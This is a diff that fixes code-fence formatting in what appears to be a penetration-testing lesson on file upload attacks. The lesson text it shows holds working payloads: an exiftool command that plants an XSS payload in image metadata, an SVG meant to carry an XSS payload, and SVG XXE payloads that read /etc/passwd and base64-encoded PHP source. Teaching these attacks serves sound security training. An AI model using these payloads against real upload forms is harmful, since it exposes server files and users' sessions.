@@ -16,8 +16,7 @@ The most basic example is when a web application allows us to upload `HTML` file
 
 Another example of XSS attacks is web applications that display an image's metadata after its upload. For such web applications, we can include an XSS payload in one of the Metadata parameters that accept raw text, like the `Comment` or `Artist` parameters, as follows:
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
 hiimeins@htb[/htb]$ exiftool HTB.jpg
 ...SNIP...
@@ -28,8 +27,7 @@ We can see that the `Comment` parameter was updated to our XSS payload. When the
 
 Finally, XSS attacks can also be carried with `SVG` images, along with several other attacks. `Scalable Vector Graphics (SVG)` images are XML-based, and they describe 2D vector graphics, which the browser renders into an image. For this reason, we can modify their XML data to include an XSS payload. For example, we can write the following to `HTB.svg`:
 
-```
-        xml
+```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
 <svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
@@ -50,8 +48,7 @@ For more about XSS, you may refer to the [Cross-Site Scripting (XSS)](https://ac
 
 Similar attacks can be carried to lead to XXE exploitation. With SVG images, we can also include malicious XML data to leak the source code of the web application, and other internal documents within the server. The following example can be used for an SVG image that leaks the content of (`/etc/passwd`):
 
-```
-        xml
+```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
 <svg>&xxe;</svg>
@@ -63,8 +60,7 @@ While reading systems files like `/etc/passwd` can be very useful for server enu
 
 To use XXE to read source code in PHP web applications, we can use the following payload in our SVG image:
 
-```
-        xml
+```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
 <svg>&xxe;</svg>
